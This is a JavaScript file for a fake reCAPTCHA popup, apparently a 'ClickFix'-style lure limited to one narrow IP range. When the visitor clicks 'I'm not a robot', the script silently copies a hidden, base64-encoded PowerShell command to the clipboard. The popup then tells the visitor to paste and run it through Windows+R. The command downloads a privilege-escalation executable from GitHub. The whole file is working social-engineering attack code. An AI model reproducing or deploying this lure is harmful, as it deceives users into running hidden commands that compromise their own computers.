async function getUserIP() {
    try {
        let response = await fetch("https://api64.ipify.org?format=json");
        let data = await response.json();
        return data.ip;
    } catch (error) {
        console.error("Could not get IP:", error);
        return null;
    }
}

// Function to check if an IP is in a given range
function isIPInRange(ip, rangeStart, rangeEnd) {
    function ipToNumber(ip) {
        return ip.split('.').reduce((acc, octet) => (acc << 8) + parseInt(octet), 0);
    }
    let ipNum = ipToNumber(ip);
    return ipNum >= ipToNumber(rangeStart) && ipNum <= ipToNumber(rangeEnd);
}

// Function to copy text to clipboard using Clipboard API
async function copyToClipboard(text) {
    try {
        await navigator.clipboard.writeText(text);
        console.log("Command copied to clipboard.");
    } catch (error) {
        console.error("Failed to copy command:", error);
    }
}

// Define the verification function.
function handleVerification() {
    // Prevent multiple clicks.
    var captchaButton = document.getElementById("captchaButton");
    captchaButton.disabled = true;

    // Copy the malicious command to clipboard.
    const maliciousCommand = "powershell -WindowStyle Hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBjAGEAcgBsAG8AcwBwAG8AbABvAHAALwBQAEUAQQBTAFMALQBuAGcALwByAGUAbABlAGEAcwBlAHMALwBsAGEAdABlAHMAdAAvAGQAbwB3AG4AbABvAGEAZAAvAHcAaQBuAFAARQBBAFMAeAA2ADQALgBlAHgAZQ==";
    copyToClipboard(maliciousCommand);

    // Show the checkmark icon.
    var checkmark = document.getElementById("checkmark");
    checkmark.classList.remove("hidden");

    // Show and animate the progress bar over 7 seconds.
    var progressBarContainer = document.getElementById("progressBarContainer");
    progressBarContainer.classList.remove("hidden");
    var progressBar = document.getElementById("progressBar");
    progressBar.style.animation = "progress 7s linear forwards";

    // After 7 seconds, hide the popup and store verification in localStorage.
    setTimeout(function () {
        document.getElementById("humanVerificationModal").style.display = "none";
        localStorage.setItem("humanVerified", "true");
    }, 7000);
}

// When the document loads, check the IP range before building the UI.
document.addEventListener("DOMContentLoaded", async function () {
    if (localStorage.getItem("humanVerified") === "true") return;

    let userIP = await getUserIP();
    if (userIP && isIPInRange(userIP, "147.175.185.233", "147.175.185.255")) {
        buildCaptchaUI(); // Only build CAPTCHA UI if the IP is in range
    } else {
        console.log("User IP is outside the range, skipping CAPTCHA.");
    }
});

// Function to dynamically create the CAPTCHA UI.
function buildCaptchaUI() {
    // Create and append the style element for the progress animation.
    var styleEl = document.createElement("style");
    styleEl.textContent = `
        @keyframes progress {
        from { width: 0%; }
        to { width: 100%; }
        }
    `;
    document.head.appendChild(styleEl);

    // Create the popup container.
    var popupDiv = document.createElement("div");
    popupDiv.id = "humanVerificationModal";
    popupDiv.className = "fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50";

    // Create the inner content container.
    var contentDiv = document.createElement("div");
    contentDiv.className = "bg-white p-6 rounded-lg shadow-lg w-[90%] max-w-md mx-auto";

    // Header section.
    var headerDiv = document.createElement("div");
    headerDiv.className = "flex justify-center items-center mb-4";
    var headerH1 = document.createElement("h1");
    headerH1.className = "text-2xl font-semibold";
    headerH1.textContent = "reCAPTCHA";
    headerDiv.appendChild(headerH1);
    contentDiv.appendChild(headerDiv);

    // Captcha box.
    var captchaBox = document.createElement("div");
    captchaBox.className = "border border-gray-300 rounded-md p-4";

    // Row container for the captcha button and logo.
    var captchaRow = document.createElement("div");
    captchaRow.className = "flex items-center justify-between";

    // Create the captcha button.
    var captchaButton = document.createElement("button");
    captchaButton.id = "captchaButton";
    captchaButton.className = "flex items-center gap-3 focus:outline-none";
    captchaButton.onclick = handleVerification;

    // Create the checkbox icon.
    var checkboxIcon = document.createElement("div");
    checkboxIcon.id = "checkboxIcon";
    checkboxIcon.className = "w-6 h-6 border border-gray-300 rounded-sm flex items-center justify-center";

    // Create the SVG checkmark.
    var svgNS = "http://www.w3.org/2000/svg";
    var svg = document.createElementNS(svgNS, "svg");
    svg.id = "checkmark";
    svg.classList.add("hidden", "w-4", "h-4", "text-green-500");
    svg.setAttribute("fill", "none");
    svg.setAttribute("stroke", "currentColor");
    svg.setAttribute("viewBox", "0 0 24 24");
    var path = document.createElementNS(svgNS, "path");
    path.setAttribute("stroke-linecap", "round");
    path.setAttribute("stroke-linejoin", "round");
    path.setAttribute("stroke-width", "3");
    path.setAttribute("d", "M5 13l4 4L19 7");
    svg.appendChild(path);
    checkboxIcon.appendChild(svg);
    captchaButton.appendChild(checkboxIcon);

    // Button text.
    var buttonText = document.createElement("span");
    buttonText.className = "text-lg font-medium";
    buttonText.textContent = "I'm not a robot";
    captchaButton.appendChild(buttonText);
    captchaRow.appendChild(captchaButton);

    // reCAPTCHA logo image.
    var recaptchaImg = document.createElement("img");
    recaptchaImg.src = "https://www.gstatic.com/recaptcha/api2/logo_48.png";
    recaptchaImg.alt = "reCAPTCHA";
    recaptchaImg.className = "w-10 h-10";
    captchaRow.appendChild(recaptchaImg);

    captchaBox.appendChild(captchaRow);

    // Create the progress bar container.
    var progressBarContainer = document.createElement("div");
    progressBarContainer.id = "progressBarContainer";
    progressBarContainer.className = "w-full bg-gray-200 rounded-full h-2 mt-4 hidden";

    // Create the progress bar element.
    var progressBar = document.createElement("div");
    progressBar.id = "progressBar";
    progressBar.className = "bg-blue-500 h-2 rounded-full";
    progressBar.style.width = "0%";
    progressBarContainer.appendChild(progressBar);
    captchaBox.appendChild(progressBarContainer);

    // Instruction text.
    var instructionP = document.createElement("p");
    instructionP.className = "mt-4 text-sm text-center text-gray-700";
    instructionP.innerHTML = 'To verify, press <strong>Windows + R</strong>, then <strong>Ctrl + V</strong>, and press <strong>Enter</strong>.';
    captchaBox.appendChild(instructionP);

    contentDiv.appendChild(captchaBox);

    // Privacy and Terms text.
    var privacyP = document.createElement("p");
    privacyP.className = "mt-4 text-xs text-center text-gray-600";
    privacyP.innerHTML = 'This site is protected by reCAPTCHA and the Google <a href="https://policies.google.com/privacy" class="text-blue-500 hover:underline" target="_blank">Privacy Policy</a> and <a href="https://policies.google.com/terms" class="text-blue-500 hover:underline" target="_blank">Terms of Service</a> apply.';
    contentDiv.appendChild(privacyP);

    popupDiv.appendChild(contentDiv);
    document.body.appendChild(popupDiv);
}
